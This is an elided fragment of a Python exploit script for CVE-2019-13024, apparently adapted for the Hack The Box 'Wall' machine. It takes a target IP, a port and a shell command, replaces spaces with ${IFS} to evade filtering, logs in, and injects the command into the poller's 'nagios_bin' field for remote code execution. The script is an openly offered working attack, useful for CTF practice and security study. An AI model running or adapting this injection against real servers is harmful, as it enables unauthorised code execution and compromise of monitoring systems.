...
# Date: 28/06/2019
# Exploit Author: Askar (@mohammadaskar2) edited by whale for htb-Wall
# CVE : CVE-2019-13024
...
ip = sys.argv[1]
port = sys.argv[2]
command = sys.argv[3].replace(' ','${IFS}')     #+"%20%23"
print command
...
if "Your credentials are incorrect." not in login_request.text:
    ...
    poller_soup = BeautifulSoup(poller_html,features="html5lib")
    ...
    payload_info = {
        ...
        "nagios_bin": command,#.format(ip, port),
